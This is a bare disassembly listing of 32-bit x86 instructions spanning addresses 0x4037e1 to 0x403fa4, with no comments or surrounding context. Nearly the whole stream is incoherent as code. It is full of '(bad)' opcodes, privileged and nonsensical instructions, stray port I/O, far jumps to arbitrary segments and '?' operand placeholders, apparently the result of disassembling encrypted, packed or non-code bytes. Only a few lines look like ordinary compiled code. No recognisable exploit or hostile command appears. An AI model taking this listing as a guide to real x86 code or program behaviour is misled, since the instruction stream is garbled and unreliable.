  4037e1:	fld    QWORD PTR [ecx+ebp*4+0x2dab477a]
  4037e8:	int3   
  4037e9:	xchg   esp,eax
  4037ea:	ins    BYTE PTR es:[edi],dx
  4037eb:	lods   al,BYTE PTR ds:[esi]
  4037ec:	jle    0x40386d
  4037ee:	call   0x3d33:0xebd3fc10
  4037f5:	mov    edi,DWORD PTR [ebx-0x71bf1a4c]
  4037fb:	mov    bh,0x37
  4037fd:	(bad)  
  4037fe:	fldcw  WORD PTR [edi+0x61057a6]
  403804:	jle    0x403869
  403806:	pop    edx
  403807:	scas   al,BYTE PTR es:[edi]
  403808:	xor    cl,dl
  40380a:	inc    edx
  40380b:	outs   dx,BYTE PTR ds:[esi]
  40380c:	inc    edi
  40380d:	dec    esi
  40380e:	mov    edi,0x44a69d7f
  403813:	loope  0x403827
  403815:	sahf   
  403816:	sub    al,0x52
  403818:	adc    eax,0x1c74ef02
  40381d:	push   0x465b274d
  403822:	push   esp
  403823:	pushf  
  403824:	inc    edi
  403825:	sbb    al,BYTE PTR [ebp+0x12bcace0]
  40382b:	fwait
  40382c:	cmp    esi,edi
  40382e:	push   eax
  40382f:	mov    ds:0xe00fb260,al
  403834:	pop    edi
  403835:	ins    DWORD PTR es:[edi],dx
  403836:	ss push cs
  403838:	cmp    edi,0xd68971bf
  40383e:	sub    BYTE PTR [edx+edx*1],dl
  403841:	cmp    DWORD PTR [ebx+0x73],ebx
  403844:	scas   al,BYTE PTR es:[edi]
  403845:	jae    0x4038ae
  403847:	add    al,0xe2
  403849:	out    dx,al
  40384a:	push   edi
  40384b:	xchg   DWORD PTR [eax-0x125a78c9],esp
  403851:	imul   edx,DWORD PTR [esi-0x6e76eba5],0x5d
  403858:	pop    ecx
  403859:	lock or cl,BYTE PTR ds:0xbe155bc6
  403860:	push   esp
  403861:	jno    0x4037f2
  403863:	outs   dx,BYTE PTR ds:[esi]
  403864:	or     eax,0x4f4a2d98
  403869:	or     DWORD PTR [eax],eax
  40386b:	dec    BYTE PTR [edx+0x630d0dc8]
  403871:	cmp    esp,0xac26410e
  403877:	popa   
  403878:	inc    esp
  403879:	pop    esp
  40387a:	jmp    0x4038e4
  40387c:	and    BYTE PTR [edi-0x31afba31],0x5
  403883:	div    dh
  403885:	fmul   QWORD PTR [eax-0x59cc4347]
  40388b:	wbinvd 
  40388d:	retf   
  40388e:	inc    edx
  40388f:	(bad)  
  403890:	dec    edx
  403891:	pushf  
  403892:	or     BYTE PTR [edi],bh
  403894:	push   eax
  403895:	retf   0x96f0
  403898:	popa   
  403899:	aaa    
  40389a:	mov    ecx,DWORD PTR [esi-0x47]
  40389d:	cmp    DWORD PTR [ecx-0x5718994],ebx
  4038a3:	minps  xmm6,XMMWORD PTR [eax-0x22c47f3e]
  4038aa:	fcom   QWORD PTR ds:0xb924751e
  4038b0:	push   0xb6fdbc14
  4038b5:	aas    
  4038b6:	mov    bl,0xc0
  4038b8:	inc    edx
  4038b9:	mov    esi,0xeb4846d2
  4038be:	cmp    al,0x85
  4038c0:	mov    al,BYTE PTR [eax+ecx*1]
  4038c3:	jmp    0x403b62
  4038c8:	into   
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x4dd405f3
  4038d5:	lods   al,BYTE PTR ds:[esi]
  4038d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038d7:	call   DWORD PTR [ebx*1+0x7efe7878]
  4038de:	js     0x403958
  4038e0:	sbb    eax,0x53dd7d6e
  4038e5:	mov    ecx,0x4931828f
  4038ea:	cmp    BYTE PTR [ecx-0x66],al
  4038ed:	xor    ebx,DWORD PTR [edi]
  4038ef:	popf   
  4038f0:	add    al,0x4f
  4038f2:	stos   DWORD PTR es:[edi],eax
  4038f3:	sub    bl,al
  4038f5:	jbe    0x4038ee
  4038f7:	js     0x4038c9
  4038f9:	ret    
  4038fa:	sti    
  4038fb:	xchg   BYTE PTR [eax-0x1331811c],ah
  403901:	retf   0x18ca
  403904:	ret    
  403905:	mov    BYTE PTR [ecx+0x12],al
  403908:	inc    ecx
  403909:	jbe    0x403914
  40390b:	jp     0x403893
  40390d:	sub    DWORD PTR [edx+0x2f],ebp
  403910:	(bad)  
  403911:	adc    dh,BYTE PTR [edi-0x1b1b50e0]
  403917:	std    
  403918:	or     al,0xcd
  40391a:	fxch   st(0)
  40391c:	cmp    edx,edx
  40391e:	sub    dh,ah
  403920:	out    dx,al
  403921:	mov    ds:0x42cb7bd2,eax
  403926:	imul   edi,DWORD PTR [edi-0x6a641a5f],0xcd333caa
  403930:	fdivr  st,st(7)
  403932:	xor    ch,BYTE PTR [edi]
  403934:	cmp    al,0x51
  403936:	push   ebp
  403937:	lds    ebp,FWORD PTR [ebp-0x211d933f]
  40393d:	sti    
  40393e:	pop    edx
  40393f:	and    BYTE PTR [ebx],ch
  403941:	pop    esi
  403942:	out    dx,eax
  403943:	inc    esi
  403944:	test   eax,0x28606901
  403949:	adc    bh,bh
  40394b:	pop    eax
  40394c:	jne    0x4038ee
  40394e:	(bad)  
  40394f:	ror    edx,cl
  403951:	pop    ss
  403952:	xchg   edi,eax
  403953:	push   es
  403954:	jnp    0x403963
  403956:	aas    
  403957:	je     0x4039c6
  403959:	and    edi,eax
  40395b:	hlt    
  40395c:	adc    eax,0xafa2d4e5
  403961:	add    eax,0x44688af4
  403966:	jns    0x403955
  403968:	jge    0x4039a9
  40396a:	icebp  
  40396b:	icebp  
  40396c:	push   ebp
  40396d:	sbb    DWORD PTR [esi],ebx
  40396f:	xor    ebp,ecx
  403971:	fld    QWORD PTR [ebx+0x56]
  403974:	pop    esp
  403975:	clc    
  403976:	pop    ebx
  403977:	inc    edi
  403978:	or     eax,0xeb44be28
  40397d:	sbb    dh,BYTE PTR [ebx+0x599fed2b]
  403983:	iret   
  403984:	jae    0x403955
  403986:	(bad)  
  403987:	sbb    esp,DWORD PTR [edx-0x40c02653]
  40398d:	mov    dl,0xc
  40398f:	cmp    edx,DWORD PTR [esp+eiz*4-0x17dd43fa]
  403996:	lods   al,BYTE PTR ds:[esi]
  403997:	jle    0x40396e
  403999:	adc    al,0x2c
  40399b:	fadd   DWORD PTR [ebx]
  40399d:	fadd   QWORD PTR [eax-0x57]
  4039a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039a1:	into   
  4039a2:	jmp    0x40399b
  4039a4:	sti    
  4039a5:	bound  esi,QWORD PTR [ecx]
  4039a7:	sbb    ebp,ebp
  4039a9:	push   ecx
  4039aa:	ja     0x403975
  4039ac:	arpl   WORD PTR [ebx],dx
  4039ae:	stos   BYTE PTR es:[edi],al
  4039af:	or     al,al
  4039b1:	popa   
  4039b2:	add    al,0xbc
  4039b4:	add    dh,BYTE PTR [eax+0x74]
  4039b7:	mul    BYTE PTR [ebx-0x31]
  4039ba:	shr    DWORD PTR ds:0xb4cc2da6,0x26
  4039c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039c2:	rcr    BYTE PTR [ebp-0x2d4c3aa9],1
  4039c8:	jno    0x403a24
  4039ca:	mov    ds:0xc96571af,eax
  4039cf:	adc    DWORD PTR [ecx],esp
  4039d1:	adc    eax,0x49252542
  4039d6:	daa    
  4039d7:	into   
  4039d8:	in     al,0xe2
  4039da:	adc    BYTE PTR [eax-0x57],0x6c
  4039de:	repz sub ecx,DWORD PTR [ebx+0x5b]
  4039e2:	pop    edi
  4039e3:	stos   DWORD PTR es:[edi],eax
  4039e4:	adc    BYTE PTR ds:0x8b4365bc,al
  4039ea:	loope  0x403995
  4039ec:	das    
  4039ed:	bound  ecx,QWORD PTR [esi-0x77dc68a9]
  4039f3:	dec    esp
  4039f4:	ficomp WORD PTR ds:0x7201779d
  4039fa:	adc    DWORD PTR [ebx],ebp
  4039fc:	inc    esp
  4039fd:	js     0x403a54
  4039ff:	mov    bh,0xbe
  403a01:	mov    esp,DWORD PTR [ebx+0x4ce4cfd0]
  403a07:	sub    eax,0xae6f336f
  403a0c:	popa   
  403a0d:	inc    esp
  403a0e:	pop    edx
  403a0f:	sub    dh,bl
  403a11:	les    esp,FWORD PTR [ecx-0x3b1012ef]
  403a17:	xor    eax,0xdc9d7bdd
  403a1c:	xchg   BYTE PTR [ecx],cl
  403a1e:	xchg   esi,eax
  403a1f:	adc    DWORD PTR [edi*8+0x282e79f6],eax
  403a26:	dec    ebx
  403a27:	mov    esi,0x5d6ad7ab
  403a2c:	repnz stc 
  403a2e:	int    0x71
  403a30:	imul   eax,DWORD PTR [edi+0x44],0x4d531bdf
  403a37:	or     DWORD PTR ds:0x699072ac,0xb93475ed
  403a41:	hlt    
  403a42:	inc    ebp
  403a43:	enter  0xd6e3,0xe8
  403a47:	push   ebx
  403a48:	pop    edx
  403a49:	daa    
  403a4a:	pusha  
  403a4b:	es jmp 0x8b42:0x7c733f0b
  403a53:	jg     0x403a1c
  403a55:	mov    cl,0x4b
  403a57:	daa    
  403a58:	mov    BYTE PTR [eax],cl
  403a5a:	push   cs
  403a5b:	xchg   edx,eax
  403a5c:	lods   eax,DWORD PTR ds:[esi]
  403a5d:	in     al,0x0
  403a5f:	dec    ecx
  403a60:	mov    bl,0xf5
  403a62:	pop    ecx
  403a63:	in     eax,0xb4
  403a65:	sub    al,0xc8
  403a67:	daa    
  403a68:	vsqrtss xmm6,xmm0,xmm2
  403a6c:	fdiv   QWORD PTR [edx+0x57]
  403a6f:	(bad)  
  403a70:	and    DWORD PTR [ebx+0x12],ecx
  403a73:	sbb    BYTE PTR [eax-0x32],dl
  403a76:	mov    ebx,DWORD PTR [edx-0x7e]
  403a79:	jno    0x403a56
  403a7b:	sbb    eax,0x17f01fc4
  403a80:	add    ch,BYTE PTR [ebp+0x71]
  403a83:	mov    ebp,0xa7a73527
  403a88:	mov    eax,0xe521111f
  403a8d:	out    0x19,eax
  403a8f:	pop    edi
  403a90:	aaa    
  403a91:	mov    ah,0x8a
  403a93:	xchg   edi,eax
  403a94:	nop
  403a95:	or     eax,0x1c7161c1
  403a9a:	outs   dx,BYTE PTR ds:[esi]
  403a9b:	xor    BYTE PTR [edi-0x32],bl
  403a9e:	dec    dl
  403aa0:	es and eax,0x2545fa07
  403aa6:	jbe    0x403b23
  403aa8:	jno    0x403abd
  403aaa:	mov    al,0x76
  403aac:	push   ebx
  403aad:	ja     0x403aa6
  403aaf:	and    ch,BYTE PTR [edi-0x2f]
  403ab2:	cld    
  403ab3:	into   
  403ab4:	faddp  st(1),st
  403ab6:	jnp    0x403b26
  403ab8:	or     edx,DWORD PTR [ebx-0x4a]
  403abb:	or     esi,ebx
  403abd:	jbe    0x403b01
  403abf:	sub    eax,0x2dfce8d3
  403ac4:	out    0x7f,al
  403ac6:	push   0xbf9df338
  403acb:	aaa    
  403acc:	adc    eax,0xc452ded3
  403ad1:	test   al,0x22
  403ad3:	sahf   
  403ad4:	hlt    
  403ad5:	jp     0x403b41
  403ad7:	add    edx,ecx
  403ad9:	call   DWORD PTR [edi]
  403adb:	mov    eax,ds:0xc9458cf0
  403ae0:	rcr    DWORD PTR [edi],1
  403ae2:	jb     0x403a8d
  403ae4:	pop    edx
  403ae5:	sub    esi,DWORD PTR [esi]
  403ae7:	xor    DWORD PTR [edx],0xfe4ccbe3
  403aed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403aee:	mov    eax,ds:0x63b7a88f
  403af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403af4:	lods   eax,DWORD PTR ds:[esi]
  403af5:	jns    0x403b29
  403af7:	imul   edx,DWORD PTR [ecx+0x54],0xd018c555
  403afe:	and    al,0x94
  403b00:	pop    ecx
  403b01:	retf   
  403b02:	push   esp
  403b03:	mov    ebp,0xfb3c1bd9
  403b08:	stos   DWORD PTR es:[edi],eax
  403b09:	rcr    BYTE PTR [esi+0x6cfbe74d],1
  403b0f:	push   ds
  403b10:	inc    esi
  403b11:	push   edi
  403b12:	dec    esp
  403b13:	addr16 ss sbb eax,0x44dfcd00
  403b1a:	retf   0x1e55
  403b1d:	xchg   ebp,eax
  403b1e:	iret   
  403b1f:	(bad)
  403b23:	(bad)  
  403b24:	std    
  403b25:	enter  0xf7d5,0xa9
  403b29:	ins    DWORD PTR es:[edi],dx
  403b2a:	pop    esi
  403b2b:	out    dx,al
  403b2c:	aad    0x9b
  403b2e:	(bad)  
  403b2f:	out    0x70,al
  403b31:	(bad)  
  403b32:	out    0xd3,eax
  403b34:	mov    bh,BYTE PTR [ebp+0x19]
  403b37:	push   esi
  403b38:	ja     0x403acd
  403b3a:	fwait
  403b3b:	aaa    
  403b3c:	and    DWORD PTR [ebx+0x8],edi
  403b3f:	push   es
  403b40:	and    BYTE PTR [eax+ebp*8],dl
  403b43:	daa    
  403b44:	jmp    0x22bd:0x7fe420fa
  403b4b:	adc    eax,edx
  403b4d:	pop    esp
  403b4e:	rol    BYTE PTR [edi-0x2fabb2da],cl
  403b54:	stos   BYTE PTR es:[edi],al
  403b55:	out    dx,al
  403b56:	lea    ebp,[esi+0x4111313f]
  403b5c:	retf   
  403b5d:	push   edx
  403b5e:	pusha  
  403b5f:	mov    al,ds:0x3b04e62e
  403b64:	xor    al,0x43
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	aad    0x67
  403b81:	frstor [edx+0x7878239a]
  403b87:	(bad)  
  403b88:	jle    0x403c02
  403b8a:	js     0x403b9c
  403b8c:	add    DWORD PTR [ebx-0x68376cf5],eax
  403b92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b93:	mov    ecx,0x1785cd4e
  403b98:	cmp    ebp,DWORD PTR [eax+edi*2-0x16]
  403b9c:	jg     0x403b56
  403b9e:	rcr    DWORD PTR [edx-0x4c28956c],cl
  403ba4:	cs loopne 0x403c21
  403ba7:	mov    esi,0x49bbfef6
  403bac:	push   edi
  403bad:	jns    0x403bdd
  403baf:	ins    BYTE PTR es:[edi],dx
  403bb0:	cmp    ecx,DWORD PTR es:[edi+0xbe33555]
  403bb7:	lahf   
  403bb8:	sub    edi,edi
  403bba:	imul   eax,DWORD PTR [esi+ebp*2+0x3a],0xffffffda
  403bbf:	popf   
  403bc0:	fist   DWORD PTR [ebx]
  403bc2:	push   edi
  403bc3:	je     0x403b9f
  403bc5:	add    BYTE PTR [edx-0x2d67079],dh
  403bcb:	push   ebp
  403bcc:	ins    BYTE PTR es:[edi],dx
  403bcd:	daa    
  403bce:	jns    0x403bb4
  403bd0:	test   al,0x17
  403bd2:	mov    al,0xb9
  403bd4:	sbb    DWORD PTR [ecx],esi
  403bd6:	cmc    
  403bd7:	pushf  
  403bd8:	cmp    al,0x56
  403bda:	(bad)  [ebx]
  403bdc:	test   eax,0x80eb8e61
  403be1:	mov    ebx,ebp
  403be3:	repnz das 
  403be5:	or     DWORD PTR [esi],0x2bad4674
  403beb:	adc    DWORD PTR [esi+0x9],edx
  403bee:	mov    ds:0x4701e813,eax
  403bf3:	test   DWORD PTR [ebp+0x22],eax
  403bf6:	add    DWORD PTR [ecx+0x29242010],eax
  403bfc:	call   0xd297697d
  403c01:	jmp    0x403b8d
  403c03:	xor    BYTE PTR [ebx+ecx*4+0x41],0xe7
  403c08:	loopne 0x403b9b
  403c0a:	mov    edx,0xc9775286
  403c0f:	cmc    
  403c10:	shr    BYTE PTR [eax+0x6b],0xcb
  403c14:	mov    ch,0xd2
  403c16:	jo     0x403bc6
  403c18:	inc    eax
  403c19:	sub    al,0xe1
  403c1b:	in     eax,0x93
  403c1d:	jle    0x403be5
  403c1f:	inc    eax
  403c20:	(bad)  
  403c21:	sti    
  403c22:	je     0x403baf
  403c24:	in     al,dx
  403c25:	mov    eax,ds:0xde890719
  403c2a:	(bad)  
  403c2b:	or     BYTE PTR [edi+0x7f],ch
  403c2e:	xchg   ebx,eax
  403c2f:	stos   DWORD PTR es:[edi],eax
  403c30:	loopne 0x403c27
  403c32:	stos   BYTE PTR es:[edi],al
  403c33:	fild   WORD PTR [eax-0x34]
  403c36:	lahf   
  403c37:	fmul   DWORD PTR [edx-0x4ae599be]
  403c3d:	or     esp,DWORD PTR [ebx+ebx*4+0x2d]
  403c41:	mov    ebx,0xae2af5f
  403c46:	lock sbb al,0x7e
  403c49:	xor    eax,0x6dd15ce3
  403c4e:	mov    edx,ecx
  403c50:	sub    eax,0x2ac11662
  403c55:	mov    cr2,ebp
  403c58:	cmp    eax,0x8583c31e
  403c5d:	pop    ecx
  403c5e:	in     eax,0x3d
  403c60:	or     al,0x65
  403c62:	ds clc 
  403c64:	sub    BYTE PTR [ebp+0x4a5f7d3a],cl
  403c6a:	fnstsw WORD PTR [ecx]
  403c6c:	xchg   ecx,eax
  403c6d:	dec    edx
  403c6e:	hlt    
  403c6f:	out    0x2a,al
  403c71:	dec    ebp
  403c72:	xchg   esi,eax
  403c73:	cld    
  403c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c75:	cmp    eax,ebx
  403c77:	inc    ecx
  403c78:	or     BYTE PTR [eax],0x95
  403c7b:	js     0x403ca6
  403c7d:	inc    eax
  403c7e:	aaa    
  403c7f:	pusha  
  403c80:	or     DWORD PTR [esi+edx*8-0x5f],esp
  403c84:	sbb    edi,DWORD PTR [ecx]
  403c86:	popa   
  403c87:	mov    ah,0x25
  403c89:	nop
  403c8a:	and    eax,0x221505fb
  403c8f:	xlat   BYTE PTR ds:[ebx]
  403c90:	mov    ecx,0xc582e5aa
  403c95:	push   edi
  403c96:	test   eax,0xfa70bb92
  403c9b:	sar    BYTE PTR [edi+0x4d71afd],1
  403ca1:	and    BYTE PTR [edx-0x4a],bl
  403ca4:	out    dx,al
  403ca5:	sub    eax,0xd3c678ca
  403caa:	pop    esi
  403cab:	mov    ebx,0x26fc5d47
  403cb0:	mov    al,0x42
  403cb2:	inc    ebp
  403cb3:	sbb    al,0xe8
  403cb5:	int3   
  403cb6:	or     al,0x27
  403cb8:	dec    ebx
  403cb9:	out    dx,al
  403cba:	and    ah,BYTE PTR [ebx-0x5e]
  403cbd:	pop    esp
  403cbe:	into   
  403cbf:	and    DWORD PTR [edx+0x78],ebx
  403cc2:	sub    edi,edx
  403cc4:	shl    BYTE PTR [ebx+0x47],0x9
  403cc8:	inc    ecx
  403cc9:	fwait
  403cca:	and    edx,DWORD PTR [edx-0x4e]
  403ccd:	in     al,dx
  403cce:	xchg   ecx,eax
  403ccf:	popf   
  403cd0:	(bad)  
  403cd1:	in     eax,0x87
  403cd3:	je     0x403c97
  403cd5:	mov    edi,0x29c920
  403cda:	aam    0x18
  403cdc:	pop    ebx
  403cdd:	dec    edi
  403cde:	int    0x50
  403ce0:	das    
  403ce1:	fnstenv [esi+eiz*8]
  403ce4:	pop    ecx
  403ce5:	jns    0x403d15
  403ce7:	ficomp WORD PTR [edi+0x1b]
  403cea:	jb     0x403c71
  403cec:	pop    esi
  403ced:	inc    ebp
  403cee:	adc    al,0xe5
  403cf0:	sahf   
  403cf1:	jl     0x403d56
  403cf3:	dec    ecx
  403cf4:	jne    0x403cc8
  403cf6:	ins    BYTE PTR es:[edi],dx
  403cf7:	add    edi,edi
  403cf9:	add    eax,0xb12c92fd
  403cfe:	inc    ebp
  403cff:	jecxz  0x403d14
  403d01:	add    ecx,DWORD PTR [edx]
  403d03:	stc    
  403d04:	pop    edx
  403d05:	sub    al,al
  403d07:	leave  
  403d08:	mov    eax,0x784ab140
  403d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d0e:	loopne 0x403cba
  403d10:	popf   
  403d11:	fcomp  st(0)
  403d13:	popa   
  403d14:	icebp  
  403d15:	je     0x403ce3
  403d17:	outs   dx,BYTE PTR ds:[esi]
  403d18:	mov    ch,0x96
  403d1a:	add    al,dl
  403d1c:	int    0xb8
  403d1e:	shr    BYTE PTR [ecx+0x19498c49],1
  403d24:	jecxz  0x403cb2
  403d26:	inc    ebp
  403d27:	jo     0x403d54
  403d29:	jecxz  0x403d25
  403d2b:	shl    DWORD PTR [ebx+ecx*1-0x33],1
  403d2f:	fdivr  DWORD PTR [ecx+eiz*8-0x1e1937ad]
  403d36:	add    ebp,esi
  403d38:	and    eax,ebp
  403d3a:	sub    ah,BYTE PTR [eax-0xc]
  403d3d:	cvtdq2ps xmm1,XMMWORD PTR [ecx+edx*4]
  403d41:	xchg   esp,esi
  403d43:	or     al,BYTE PTR [esi+0x676eec26]
  403d49:	sub    al,0xc4
  403d4b:	loopne 0x403d04
  403d4d:	sbb    eax,0x159ee7a
  403d52:	adc    BYTE PTR [ebx],0xdf
  403d55:	fs push ss
  403d57:	xor    bh,BYTE PTR [ebx]
  403d59:	sbb    al,0x26
  403d5b:	retf   0xd83b
  403d5e:	ins    BYTE PTR es:[edi],dx
  403d5f:	popa   
  403d60:	sahf   
  403d61:	adc    eax,0xc9233b9f
  403d66:	loope  0x403d0b
  403d68:	push   ecx
  403d69:	call   0xf2d3:0x35a8b8b4
  403d70:	nop
  403d71:	clc    
  403d72:	xchg   edx,eax
  403d73:	enter  0xa80,0x23
  403d77:	out    0x15,eax
  403d79:	mov    bl,BYTE PTR [ecx-0x6b]
  403d7c:	xor    BYTE PTR [edi+0x72],ah
  403d7f:	iret   
  403d80:	ja     0x403dad
  403d82:	add    dl,BYTE PTR [ecx+0x1dae4efb]
  403d88:	pop    ds
  403d89:	popf   
  403d8a:	adc    ebx,DWORD PTR cs:[edx+0x7071c06]
  403d91:	scas   al,BYTE PTR es:[edi]
  403d92:	subps  xmm5,xmm0
  403d95:	inc    ecx
  403d96:	test   eax,0xb5ceb5cc
  403d9b:	aas    
  403d9c:	pop    esi
  403d9d:	adc    bh,BYTE PTR [edx+0x7a4ba90d]
  403da3:	ja     0x403dbe
  403da5:	adc    ah,0x98
  403da8:	pushf  
  403da9:	cdq    
  403daa:	sti    
  403dab:	pop    edx
  403dac:	sub    al,BYTE PTR [esi-0x466f926f]
  403db2:	cmp    eax,0xc8c12ef5
  403db7:	cmp    ecx,edx
  403db9:	daa    
  403dba:	push   ecx
  403dbb:	or     eax,0x89d57bd7
  403dc0:	mov    bh,0x73
  403dc2:	cmp    DWORD PTR [edi-0x46b0192c],esi
  403dc8:	xor    ah,BYTE PTR [esi-0x7a]
  403dcb:	xor    cl,BYTE PTR [ebx-0x4a]
  403dce:	cmp    eax,0x1c1ff287
  403dd3:	adc    DWORD PTR [edx],esi
  403dd5:	xor    BYTE PTR [ecx-0x57],bl
  403dd8:	mov    ah,0x3a
  403dda:	(bad)  
  403ddb:	ja     0x403dc7
  403ddd:	xchg   edx,eax
  403dde:	pop    ds
  403ddf:	push   edi
  403de0:	cmc    
  403de1:	pop    esp
  403de2:	push   esp
  403de3:	fcomp  QWORD PTR [eax+0xbd4499d]
  403de9:	sbb    BYTE PTR [ecx+0x7e],dh
  403dec:	fcmovne st,st(6)
  403dee:	ror    DWORD PTR [edi],cl
  403df0:	cmp    eax,0x5c7b0536
  403df5:	push   esp
  403df6:	test   ecx,esp
  403df8:	mov    al,0x68
  403dfa:	cmp    bl,ah
  403dfc:	push   esi
  403dfd:	push   edi
  403dfe:	mov    ebp,0x66ba09d7
  403e03:	sbb    DWORD PTR [eax-0x3c],0xffffffe7
  403e07:	sub    edx,DWORD PTR [esi+0x11f09425]
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0x7fdd8593
  403e30:	xchg   edx,eax
  403e31:	and    ecx,DWORD PTR [ebx]
  403e33:	sbb    BYTE PTR [eax],ah
  403e35:	js     0x403eaf
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403e54
  403e3c:	xor    ebx,DWORD PTR [ecx+0x4fe60ad0]
  403e42:	or     ch,BYTE PTR [ecx+0x7e]
  403e45:	pop    edi
  403e46:	and    edx,edx
  403e48:	in     al,0xf2
  403e4a:	pop    edx
  403e4b:	enter  0x6c6b,0xa0
  403e4f:	push   edx
  403e50:	mul    DWORD PTR [edx-0xb5f51a9]
  403e56:	data16 jae 0x403ea5
  403e59:	mov    dh,BYTE PTR [edx]
  403e5b:	int    0x10
  403e5d:	out    0x92,eax
  403e5f:	retf   
  403e60:	cs ins DWORD PTR es:[edi],dx
  403e62:	sbb    edx,DWORD PTR [edi+edi*1+0xe4fd091]
  403e69:	sbb    DWORD PTR [ebx+0x16],ebx
  403e6c:	ins    BYTE PTR es:[edi],dx
  403e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e6e:	pop    es
  403e6f:	inc    edi
  403e70:	add    eax,0xdacf5ace
  403e75:	loop   0x403e2b
  403e77:	data16 (bad) 
  403e7a:	pusha  
  403e7b:	ins    DWORD PTR es:[edi],dx
  403e7c:	iret   
  403e7d:	or     eax,0x1cb12395
  403e82:	inc    ebx
  403e83:	test   DWORD PTR [edi+ebp*4],ebp
  403e86:	pop    es
  403e87:	int3   
  403e88:	hlt    
  403e89:	pushf  
  403e8a:	cmp    eax,DWORD PTR [eax+0x12]
  403e8d:	xor    eax,0x809b1abe
  403e92:	mov    es,esp
  403e94:	ret    
  403e95:	hlt    
  403e96:	xchg   edi,eax
  403e97:	and    eax,0xab23e627
  403e9c:	jle    0x403e72
  403e9e:	lahf   
  403e9f:	push   ebp
  403ea0:	push   ss
  403ea1:	fcomp  DWORD PTR [ebp-0x75]
  403ea4:	mov    ch,0x63
  403ea6:	in     eax,dx
  403ea7:	inc    edi
  403ea8:	shl    DWORD PTR [ecx+0x45],cl
  403eab:	push   0x45
  403ead:	mov    WORD PTR [edi+eax*1],?
  403eb0:	fst    st(0)
  403eb2:	mov    ?,edx
  403eb4:	js     0x403eab
  403eb6:	push   0x26
  403eb8:	fild   QWORD PTR es:[eax]
  403ebb:	imul   ecx,DWORD PTR [edx+0xf],0xe1c35690
  403ec2:	inc    ebp
  403ec3:	dec    ebp
  403ec4:	push   esi
  403ec5:	add    DWORD PTR [esi+eax*4],ebx
  403ec8:	(bad)  
  403ecb:	retf   0xd622
  403ece:	(bad)  
  403ecf:	cmp    BYTE PTR [edx],bl
  403ed1:	pop    esp
  403ed2:	ins    BYTE PTR es:[edi],dx
  403ed3:	gs fwait
  403ed5:	adc    cl,BYTE PTR [eax+0xf]
  403ed8:	xchg   DWORD PTR [eax],edi
  403eda:	push   edx
  403edb:	push   es
  403edc:	(bad)  
  403ede:	popa   
  403edf:	mov    ds:0x7b1f1453,eax
  403ee4:	adc    BYTE PTR [eax+0x32d40c51],dh
  403eea:	cmp    ebp,DWORD PTR [edi+0x15]
  403eed:	cmp    DWORD PTR [ebx+0x1e0398d],0xb404606b
  403ef7:	push   edx
  403ef8:	sbb    eax,0x522e146
  403efd:	(bad)  
  403efe:	sub    al,0xfb
  403f00:	xor    DWORD PTR [ebp-0x41],0xfffffffe
  403f04:	mov    ah,0x9a
  403f06:	outs   dx,DWORD PTR ds:[esi]
  403f07:	pop    ds
  403f08:	push   ecx
  403f09:	xchg   DWORD PTR [edi+0x390db3a1],eax
  403f0f:	iret   
  403f10:	push   es
  403f11:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f13:	sbb    eax,ecx
  403f15:	inc    di
  403f17:	fstp   QWORD PTR [eax]
  403f19:	iret   
  403f1a:	push   edx
  403f1b:	pop    ss
  403f1c:	and    BYTE PTR [edx+esi*2+0x7d3cbac3],0x8b
  403f24:	inc    edx
  403f25:	clc    
  403f26:	fsubr  DWORD PTR [ebx+0x738cad7]
  403f2c:	out    0x6e,eax
  403f2e:	rol    BYTE PTR [edi],cl
  403f30:	cmp    dl,ah
  403f32:	lods   al,BYTE PTR gs:[esi]
  403f34:	shl    BYTE PTR [eax],cl
  403f36:	cdq    
  403f37:	adc    al,0x72
  403f39:	hlt    
  403f3a:	adc    al,0xe5
  403f3c:	imul   eax,ebx,0x4f65c197
  403f42:	pop    edi
  403f43:	mov    ah,0x51
  403f45:	add    edx,DWORD PTR [ecx+0x537fa898]
  403f4b:	xor    edx,esp
  403f4d:	pop    edi
  403f4e:	add    ecx,DWORD PTR [eax+eax*2+0x4]
  403f52:	pop    es
  403f53:	inc    ebp
  403f54:	or     eax,0x559d98d4
  403f59:	jg     0x403fc8
  403f5b:	test   eax,0x74c0ec35
  403f60:	(bad)  
  403f61:	nop
  403f62:	xor    BYTE PTR [ebp-0x21],0xfe
  403f66:	sub    esp,ebx
  403f68:	aam    0x5f
  403f6a:	and    al,0xea
  403f6c:	sbb    BYTE PTR [edi+0x51],0x27
  403f70:	mov    eax,ds:0xbdd01170
  403f75:	aam    0xd3
  403f77:	mov    esp,0x2e9fa6a2
  403f7c:	inc    eax
  403f7d:	in     al,0x24
  403f7f:	les    ebx,FWORD PTR [ecx-0x650a817d]
  403f85:	rep lods eax,DWORD PTR ds:[esi]
  403f87:	(bad)  
  403f88:	call   esp
  403f8a:	or     edx,DWORD PTR [edi-0x1bcb12d6]
  403f90:	out    dx,al
  403f91:	mov    ebp,0x24c4a0fa
  403f96:	mov    ds:0xddf453f1,eax
  403f9b:	loope  0x404013
  403f9d:	mov    ds:0x3ecd983,eax
  403fa2:	jmp    0x403fdc
  403fa4:	arpl   WORD PTR [ecx-0x5452d71],ax
